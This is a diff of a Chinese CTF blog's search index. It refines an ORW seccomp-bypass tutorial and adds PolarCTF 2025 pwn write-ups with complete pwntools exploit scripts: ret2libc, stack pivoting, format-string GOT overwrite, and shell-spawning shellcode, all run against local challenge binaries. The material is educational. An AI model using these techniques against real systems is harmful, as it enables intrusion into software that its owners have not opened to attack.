@@ -739,7 +739,7 @@
 
 <h2 id="沙箱检测"><a href="#沙箱检测" class="headerlink" title="沙箱检测"></a>沙箱检测</h2><p>首先安装seccomp-tools</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
-<p>工具用法：seccomp-tools dump “程序”<br><img src="/images/p2/image-1.png"><br>可以看到程序如果调用了execve或execveat，会跳转到0004，然后被KILL掉，也就是程序禁用了execve和execveat <strong>（system函数实质上也是调用了execve函数，所以也禁用了system函数）</strong> </p>
+<p>工具用法：seccomp-tools dump “程序”<br><img src="/./images/p2/image-1.png"><br>可以看到程序如果调用了execve或execveat，会跳转到0004，然后被KILL掉，也就是程序禁用了execve和execveat <strong>（system函数实质上也是调用了execve函数，所以也禁用了system函数）</strong> </p>
 <h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>想想我们以前是怎么拿到flag的？我们是先get shell，然后在shell中去执行我们想要的操作（cat &#x2F;flag），但如果程序禁用了execve，能不能跳过get shell的步骤，去直接拿到flag呢？</p>
 <p>这就是ORW（open,read,write）的攻击方式：open打开目标的flag文件，read读取flag文件，write显示flag文件的内容。</p>
 <p><strong>open()：打开文件</strong></p>
@@ -758,14 +758,22 @@
 <h1 id="例1：ORW-shellcode-极客大挑战-2019-Not-Bad"><a href="#例1：ORW-shellcode-极客大挑战-2019-Not-Bad" class="headerlink" title="例1：ORW_shellcode [极客大挑战 2019]Not Bad"></a>例1：ORW_shellcode [极客大挑战 2019]Not Bad</h1><blockquote>
 <p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2Vz">https://buuoj.cn/challenges<i class="fa fa-external-link-alt"></i></span></p>
 </blockquote>
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec;file，64位，保护全关——没有开NX保护，可以在栈上写shellcode<br><img src="/images/p2/image-2.png"><br>IDA里面看到有三个函数，并在0x123000处开辟了0x1000的<strong>可写可执行</strong>的空间<br><img src="/images/p2/image-3.png"></p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec;file，64位，保护全关——没有开NX保护，可以在栈上写shellcode<br><img src="/./images/p2/image-2.png"><br>IDA里面看到有三个函数，并在0x123000处开辟了0x1000的<strong>可写可执行</strong>的空间<br><img src="/./images/p2/image-3.png"></p>
 <p>第一个函数开启了seccomp函数，将他重命名为seccomp_init</p>
-<p><img src="/images/p2/image-4.png"><br>第二个函数是设置缓存区，不用管<br><img src="/images/p2/image-5.png"><br>第三个函数就是我们的vuln函数了，buf这里可以看到一个明显的栈溢出，溢出长度为0x18字节<br><img src="/images/p2/image-6.png"></p>
-<p>另外我们找到了一个 jmp rsp 汇编指令的地址，这个jmp rsp到底有什么用呢？我们在后面讲一下<br><img src="/images/p2/image-7.png"><br>既然开启了沙箱保护，那我们就用seccomp-tools看一下，可以看到函数允许了open,write,read函数，可以通过ORW的方式去获取到flag的内容<br><img src="/images/p2/image-8.png"></p>
+<p><img src="/./images/p2/image-4.png"><br>第二个函数是设置缓存区，不用管<br><img src="/./images/p2/image-5.png"><br>第三个函数就是我们的vuln函数了，buf这里可以看到一个明显的栈溢出，溢出长度为0x18字节<br><img src="/./images/p2/image-6.png"></p>
+<p>另外我们找到了一个 jmp rsp 汇编指令的地址，这个jmp rsp到底有什么用呢？我们在后面讲一下<br><img src="/./images/p2/image-7.png"><br>既然开启了沙箱保护，那我们就用seccomp-tools看一下，可以看到函数允许了open,write,read函数，可以通过ORW的方式去获取到flag的内容<br><img src="/./images/p2/image-8.png"></p>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>溢出的长度只有0x18，是不够我们写入shellcode的，但是mmap为我们在0x123000开始的位置提供了很大一片空间，那么就可以用read函数在这块空间写入我们的shellcode（shellcode写什么？当然是open打开flag、read写入flag、write输出flag）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmap = 0x123000</span><br><span class="line">orw = shellcraft.open(&#x27;./flag&#x27;)        </span><br><span class="line">orw+ = shellcraft.read(3,mmap,0x100)      </span><br><span class="line">orw+ = shellcraft.write(1,mmap,0x100)</span><br><span class="line">payload = cyclic(0x20+8) + asm(shellcraft.read(0,mmap,0x100))</span><br></pre></td></tr></table></figure>
 <p>这样send(payload)之后我们再send(orw)，就向mmap的空间写入了我们的shellcode，但是接下来的问题就是如何跳转到这里执行shellcode。这里就可以讲一下jmp rsp的作用</p>
-<h2 id="jmp-rsp到底有什么用呢？"><a href="#jmp-rsp到底有什么用呢？" class="headerlink" title="jmp rsp到底有什么用呢？"></a>jmp rsp到底有什么用呢？</h2><p>调试看一下正常情况的vuln函数结束前后的栈结构，在leave;ret之前rsp的地址为0xddc0<br><img src="/images/p2/image-9.png"><br>leave，将rsp移到了rbp并+8<br><img src="/images/p2/image-10.png"><br>ret，rsp再+8<br><img src="/images/p2/image-11.png"><br>总的来说，rsp从0xddc0的位置来到了0xddf0的位置，想象一下如果我们将ret覆盖为 jmp rsp ，会怎么样呢？因为rsp现在来到了0xddf0，所以rip会指向0xddf0。<br>那么我们就知道该如何进行跳转了，把填充垃圾数据的部分利用起来，看看下边右图的栈结构<br><img src="/images/p2/image-12.png"><br>在栈顶写入read(0,mmap,0x100);mov rax;0x123000;call rax，填充垃圾数据，然后将ret覆盖为jmp esp，那么rip重新指向现在的rsp的值，接下来rsp-0x30（0x30&#x3D;填充的0x28+rsp自增的8），回到绿色的那两行，这两行用来做什么的？向read读入我们的orw，并且call调用它</p>
+<h2 id="jmp-rsp到底有什么用呢？"><a href="#jmp-rsp到底有什么用呢？" class="headerlink" title="jmp rsp到底有什么用呢？"></a>jmp rsp到底有什么用呢？</h2><p>调试看一下正常情况的vuln函数结束前后的栈结构，在leave;ret之前rsp的地址为0xddc0<br><img src="/./images/p2/image-9.png"><br>leave，将rsp移到了rbp并+8<br><img src="/./images/p2/image-10.png"><br>ret，rsp再+8<br><img src="/./images/p2/image-11.png"></p>
+<p><code>rsp</code>从<code>0xddc0</code>的位置来到了<code>0xddf0</code>的位置，想象一下如果我们将<code>ret</code>覆盖为<code>jmp rsp</code>，并且在后面跟上<code>sub rsp,offset;jmp rsp</code>，那么：</p>
+<ol>
+<li>程序的执行流<code>rip</code>来到<code>0xddf0</code>，先执行<code>jmp rsp</code>这条指令。</li>
+<li>随后<code>rip+8</code>执行下面的<code>sub rsp,offset</code></li>
+<li>然后执行<code>jmp rsp</code>，<code>rip</code>来到<code>0xddf0-offset</code>。</li>
+</ol>
+<p>可以看到，<code>sub rsp,offset;jmp rsp</code>实际上控制了<code>eip</code>，如果我们将<code>rsp-offset</code>的值设为shellcode地址，那么自然程序就会去执行我们的shellcode了。</p>
+<p>那么我们就知道该如何进行跳转了，把填充垃圾数据的部分利用起来，看看下边右图的栈结构<br><img src="/./images/p2/image-12.png"><br>在栈顶写入read(0,mmap,0x100);mov rax;0x123000;call rax，填充垃圾数据，然后将ret覆盖为jmp esp，那么rip重新指向现在的rsp的值，接下来rsp-0x30（0x30&#x3D;填充的0x28+rsp自增的8），回到绿色的那两行，这两行用来做什么的？向read读入我们的orw，并且call调用它</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(0,mmap,0x100)) +asm(&#x27;mov r15,0x123000;call r15&#x27;)</span><br><span class="line">payload = payload.ljust(0x28,b&#x27;\x90&#x27;)</span><br><span class="line">payload += p64(jmp_rsp) + asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)</span><br></pre></td></tr></table></figure>
 
 <blockquote>
@@ -779,16 +787,16 @@
 <h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>先把ld和libc链接到程序</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ patchelf --set-interpreter /home/kuban/Desktop/pwn/test/orw/ld-2.31.so vuln </span><br><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ patchelf --replace-needed libc.so.6 /home/kuban/Desktop/pwn/test/orw/libc-2.31.so vuln</span><br><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ ldd vuln </span><br><span class="line">        linux-vdso.so.1 (0x00007fff70b25000)</span><br><span class="line">        /home/kuban/Desktop/pwn/test/orw/libc-2.31.so (0x000076c7d729c000)</span><br><span class="line">        /home/kuban/Desktop/pwn/test/orw/ld-2.31.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x000076c7d7490000)</span><br></pre></td></tr></table></figure>
 
-<p>checksec;file，64位，开启NX保护<br><img src="/images/p2/image-13.png"><br>IDA里面看一下<br>main函数开启了一个沙箱，输出一行后调用vuln函数<br><img src="/images/p2/image-14.png"><br>vuln函数就是一个非常简单的栈溢出，溢出长度有0x30个字节<br><img src="/images/p2/image-15.png"><br>检测一下沙箱，可以看到函数禁用了execve函数<br><img src="/images/p2/image-16.png"><br>记录一下gadget<br><img src="/images/p2/image-17.png"></p>
+<p>checksec;file，64位，开启NX保护<br><img src="/./images/p2/image-13.png"><br>IDA里面看一下<br>main函数开启了一个沙箱，输出一行后调用vuln函数<br><img src="/./images/p2/image-14.png"><br>vuln函数就是一个非常简单的栈溢出，溢出长度有0x30个字节<br><img src="/./images/p2/image-15.png"><br>检测一下沙箱，可以看到函数禁用了execve函数<br><img src="/./images/p2/image-16.png"><br>记录一下gadget<br><img src="/./images/p2/image-17.png"></p>
 <h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>这道题主要有四个问题需要解决</p>
 <ol>
 <li><p>禁用了execve<br>解决方法：当然是orw啦</p>
 </li>
 <li><p>程序没有open、write函数<br>解决方法：用puts泄露libc，在libc中找到open,write并且返回到vuln函数继续下一步的利用</p>
 </li>
-<li><p>栈溢出长度只有0x28，不够写入ROP链<br>解决方法：利用leave_ret gadget将栈迁移到bss段<br><img src="/images/p2/image-18.png"></p>
+<li><p>栈溢出长度只有0x28，不够写入ROP链<br>解决方法：利用leave_ret gadget将栈迁移到bss段<br><img src="/./images/p2/image-18.png"></p>
 </li>
-<li><p>我们open之后，read和write要用到rdi,rsi和rdx三个寄存器传参，可是我们没有控制rdx的gadget？<br>解决办法：使用libc里面的rsi和rdx，libc_base+[libc_rsi&#x2F;rdx] 就可以了（具体看一下exp应该就懂了）<br><img src="/images/p2/image-19.png"></p>
+<li><p>我们open之后，read和write要用到rdi,rsi和rdx三个寄存器传参，可是我们没有控制rdx的gadget？<br>解决办法：使用libc里面的rsi和rdx，libc_base+[libc_rsi&#x2F;rdx] 就可以了（具体看一下exp应该就懂了）<br><img src="/./images/p2/image-19.png"></p>
 <blockquote>
 <p>其实对于问题3，我们也可以在libc中找到pop rsp的指令实现栈迁移，大家伙儿感兴趣可以试试</p>
 </blockquote>
@@ -799,11 +807,11 @@
 <p>计算libc基地址，写出目标中我们需要的函数和gadget的地址</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">open_addr = libc_base + libc.symbols[&#x27;open&#x27;]</span><br><span class="line">read_addr = libc_base + libc.symbols[&#x27;read&#x27;] # read_addr = elf.plt[&#x27;read&#x27;]</span><br><span class="line">write_addr = libc_base + libc.symbols[&#x27;write&#x27;]</span><br><span class="line">pop_rsi = libc_base + libc_dump_rsi</span><br><span class="line">pop_rdi = libc_base + libc_dump_rdi</span><br></pre></td></tr></table></figure>
 
-<p>第二步：第一步完成后程序回到了vuln函数即将执行read(0, buf, 0x130uLL); 看一下汇编，可以看到这个read 写入的位置在 rbp-0x100 的位置<br><img src="/images/p2/image-20.png"></p>
+<p>第二步：第一步完成后程序回到了vuln函数即将执行read(0, buf, 0x130uLL); 看一下汇编，可以看到这个read 写入的位置在 rbp-0x100 的位置<br><img src="/./images/p2/image-20.png"></p>
 <p>我们想要向bss段写入我们的orw，那么我们可以将rbp迁移到newrbp&#x3D;bss+0x200的位置，read就会向newrbp-0x100的位置写入数据了，我们的payload2这样构造</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newrbp = elf.bss(0x200)</span><br><span class="line">payload2 = cyclic(0x100) + p64(newrbp) + p64(?)</span><br></pre></td></tr></table></figure>
 
-<p>返回地址填什么？填vuln就错了，我们得直接去找到执行read(0, buf, 0x130uLL)的指令，才能向newrbp-0x100的位置写入ROP<br><img src="/images/p2/image-21.png"></p>
+<p>返回地址填什么？填vuln就错了，我们得直接去找到执行read(0, buf, 0x130uLL)的指令，才能向newrbp-0x100的位置写入ROP<br><img src="/./images/p2/image-21.png"></p>
 <p>这个指令在0x4012CF，我们可以写成vuln+0xF</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newrbp = elf.bss(0x200)</span><br><span class="line">payload2 = cyclic(0x100) + p64(newrbp) + p64(vuln_addr + 0xF)</span><br><span class="line">io.sendline(payload2)</span><br></pre></td></tr></table></figure>
 
@@ -882,6 +890,119 @@
         <tag>栈迁移</tag>
         <tag>ciscn_2019_es_2</tag>
         <tag>Black Watch 入群题-PWN1</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PolarCTF2025春季个人挑战赛——部分WP</title>
+    <url>/posts/b08e/</url>
+    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>这是polarctf2025春季个人挑战赛——栈溢出部分，堆系列有两道搞不懂，先放出来这些，后面继续学堆去咯~</p>
+<blockquote>
+<p>题目附件：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t1YmFuc2VjL3B3bi90cmVlL21haW4vcG9sYXJjdGYyMDI1X1NwcmluZw==">https://github.com/kubansec/pwn/tree/main/polarctf2025_Spring<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="koi"><a href="#koi" class="headerlink" title="koi"></a>koi</h1><p>知识点：</p>
+<ul>
+<li>ret2read</li>
+<li>ret2libc</li>
+</ul>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，64位小端，只开了NX保护：</p>
+<p><img src="/image.png"></p>
+<p>IDA中打开</p>
+<p><img src="/image-2.png"></p>
+<p>switch()只会进行一次，所以不用想肯定是利用存在栈溢出的这个wrshell()函数，注意wrshell()中read只能溢出一个字长，也就是只能覆盖rbp。</p>
+<p>看到if判断</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( v4 == 520 &amp;&amp; n == 520 )</span><br><span class="line"> &#123;</span><br><span class="line">   puts(&quot;GOOD&quot;);</span><br><span class="line">   xxx();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>我们要进入这个xxx()函数，得满足<code>v4 == 520 &amp;&amp; n == 520</code>这个条件，v4是我们输入的，我们需要再修改n的值为520，由于只有一次scanf的机会，所以想到在scanf的时候，同时给v4和n读入520。<br>观察scanf前的处理</p>
+<p><img src="/image-6.png"></p>
+<p>var_4是<code>地址-4</code>，<code>call scanf</code>前将rbp-4的地址赋给rax，作为scanf拟写入的参数，而rbp是我们可以随意覆盖的。<br>由于我们想要修改的变量n的地址在<code>0x60108C</code>，所以将rbp覆盖为<code>0x60108C+4</code>。</p>
+<p><img src="/image-3.png"></p>
+<p>这样一来scanf读入v4的值的同时，n也会写入同样的值。<br><em>这种攻击手法称为栈迁移中return2read攻击</em></p>
+<p>接着顺利进入<code>xxx()</code>：</p>
+<p><img src="/image-7.png"></p>
+<p>有0x100的溢出空间，常规泄露地址打ret2libc即可。</p>
+<p>这里泄露puts和read的地址，在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到对应的libc直接打就行</p>
+<p><img src="/image-8.png"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./koi&quot;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span><br><span class="line">n_addr = 0x60108c</span><br><span class="line">xxx_addr = 0x4009CE</span><br><span class="line">rdi = 0x400a63</span><br><span class="line">ret = 0x4005d9</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">payload = cyclic(0x50) + p64(n_addr + 0x4)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;520&#x27;)</span><br><span class="line"></span><br><span class="line"># 泄露puts</span><br><span class="line">io.recv() </span><br><span class="line">elf = ELF(&#x27;./koi&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 泄露read</span><br><span class="line">io.recv()</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) +p64(rdi) + p64(read_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x80e50</span><br><span class="line">system_addr = libc_base + 0x50d70</span><br><span class="line">binsh_addr = libc_base + 0x1d8678</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(binsh_addr) + p64(ret) +  p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="bllhl-mom"><a href="#bllhl-mom" class="headerlink" title="bllhl_mom"></a>bllhl_mom</h1><p>知识点：</p>
+<ul>
+<li>格式化字符串漏洞泄露canary</li>
+<li>栈迁移</li>
+</ul>
+<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先checksec看一下<br><img src="/image-9.png"><br>32位小端，开启了canary和NX保护.</p>
+<p>IDA中看到，漏洞函数mom()确实存在canary，并且这个canary位于<code>ebp-0xc</code>的位置</p>
+<p><img src="/image-11.png"></p>
+<p>mom()中有三次read，均存在漏洞:</p>
+<p><img src="/image-10.png"></p>
+<p>第一个read只能输5字节，存在格式化字符串漏洞，可以泄露栈上信息，那么就用他来泄露canary，调试中算一下偏移是<code>%23$p</code>;</p>
+<p><img src="/image-12.png"></p>
+<p>第二个和第三个read均可以溢出2个字长，因为溢出字节很少，只能栈迁移到栈上.<br>那么第二个read就是用来泄露ebp的值，第三个read用来栈迁移。</p>
+<blockquote>
+<p>跟<code>ciscn_2019_es_2</code>这道题有点像，感兴趣可以去读我的这篇文章<a href="https://kubansec.github.io/posts/6e43/?highlight=%E6%A0%88%E8%BF%81%E7%A7%BB">栈迁移学习总结</a></p>
+</blockquote>
+<p>因为程序中有system，但没有<code>/bin/sh</code>，所以需要在栈中部署<code>/bin/sh</code>，最终布置的栈结构和栈帧的变化如图所示：</p>
+<p><img src="/image-13.png"></p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./bllhl_mom&#x27;)</span><br><span class="line">elf = ELF(&#x27;./bllhl_mom&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">io.recv()</span><br><span class="line">io.send(b&#x27;%23$p&#x27;)</span><br><span class="line">canary = int(io.recv(10),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">io.send(cyclic(0x50))</span><br><span class="line">io.recvuntil(b&#x27;taaa&#x27;)</span><br><span class="line">ebp = u32(io.recv(4))</span><br><span class="line">print(hex(ebp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">leave_ret = 0x0804861f</span><br><span class="line">system_addr = 0x08048490</span><br><span class="line">binsh_addr = ebp - 0x50</span><br><span class="line">canary_addr = ebp - 0xc</span><br><span class="line">payload = b&#x27;AAAA&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x44,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload = payload.ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(ebp-0x60) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><p>知识点：</p>
+<ul>
+<li>ret2libc</li>
+</ul>
+<h2 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，32位程序，只开了NX保护<br><img src="/image-14.png"></p>
+<p>IDA 里面看到是一个非常简单的栈溢出<br><img src="/image-15.png"></p>
+<p>那么直接泄露地址，打ret2libc就可以了。可以多泄露几个函数，交叉查询就不用一个一个去尝试了</p>
+<p>在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到libc<br><img src="/image-18.png"></p>
+<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./libc&#x27;)</span><br><span class="line">elf = ELF(&#x27;libc&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">jiu_addr = 0x08048561</span><br><span class="line"></span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(puts_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">puts_addr = u32(io.recv(4))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">read_addr = u32(io.recv(4))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x0732a0</span><br><span class="line">sys_addr = libc_base +  0x048170</span><br><span class="line">binsh_addr = libc_base + 0x1bd0d5</span><br><span class="line">payload = cyclic(58+4) + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="fmt-text"><a href="#fmt-text" class="headerlink" title="fmt_text"></a>fmt_text</h1><p>知识点：</p>
+<ul>
+<li>格式化字符串漏洞</li>
+<li>劫持got表</li>
+</ul>
+<h2 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，32位，开启canary和NX保护，<code>RELRO:      Partial RELRO</code>代表got表可写<br><img src="/image-20.png"></p>
+<p>IDA里面分析：</p>
+<p><img src="/image-21.png"></p>
+<p>yichu函数存在两次格式化字符串漏洞</p>
+<p>测一下偏移，偏移为6：</p>
+<p><img src="/image-23.png"></p>
+<p>并且存在system函数:<br><img src="/image-22.png"></p>
+<p>那么思路就是利用第一次格式化字符串漏洞将printf的got表指针指向system函数，第二次发送<code>/bin/sh</code>构造<code>printf(&#39;/bin/sh&#39;)</code>，程序就会执行<code>system(&#39;/bin/sh&#39;)</code>了</p>
+<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./fmt_text&#x27;)</span><br><span class="line">elf = ELF(&#x27;fmt_text&#x27;)</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_plt&#125;) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="bllbl-shellcode-2"><a href="#bllbl-shellcode-2" class="headerlink" title="bllbl_shellcode_2"></a>bllbl_shellcode_2</h1><p>知识点：</p>
+<ul>
+<li>ret2shellcode</li>
+</ul>
+<h2 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，64位，保护全关，既然NX保护是关的，意味着可以用ret2shellcode打。<br><img src="/image-25.png"></p>
+<p>IDA里面看到yichu函数发生溢出，并且直接把写入的地址给我们了。</p>
+<p><img src="/image-26.png"></p>
+<p>还给了我们<code>jsp rsp</code>指令</p>
+<p><img src="/image-29.png"></p>
+<p>那么思路就是将shellode写到栈上去，利用<code>jsp rsp</code>指令跳转到shellcode写入地址，执行shellcode即可。</p>
+<p>这里再讲一下偏移，下断点到read处，输入<code>aaaaaaaa</code>：</p>
+<p><img src="/image-24.png"></p>
+<p>看到他是从<code>rsi-3</code>的位置开始写入的，那么写入<code>13个字节 ( = 16 - 3)</code>就能覆盖到返回地址。</p>
+<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;bllbl_shellcode_2&#x27;)</span><br><span class="line"></span><br><span class="line">jmp_rsp = 0x401380</span><br><span class="line">binsh_addr = 0x402047</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">buf_addr = int(io.recv(12),16)</span><br><span class="line">success(&#x27;buf_addr = &gt;&gt;&gt; 0x%x&#x27; % buf_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&quot;&quot;&quot;</span><br><span class="line">mov al,0x3b;</span><br><span class="line">mov esi,edi</span><br><span class="line">mov edi,0x402047</span><br><span class="line">mov edx,esi</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">shellcode += p64(jmp_rsp)</span><br><span class="line">shellcode += asm(&quot;&quot;&quot;</span><br><span class="line">sub rsp,21;   # 13+8</span><br><span class="line">jmp rsp</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, &#x27;b *0x401376&#x27;)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzI1MDJfOTEyNjkyMTYvYXJ0aWNsZS9kZXRhaWxzLzE0NjQ1MzU2NA==">https://blog.csdn.net/2502_91269216/article/details/146453564<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW0zWG5ZNkVBNQ==">https://www.bilibili.com/video/BV1m3XnY6EA5<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>pwn学习</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>PolarCTF</tag>
+        <tag>koi</tag>
+        <tag>bllhl_mom</tag>
+        <tag>bllbl_shellcode_2</tag>
+        <tag>libc</tag>
       </tags>
   </entry>
 </search>
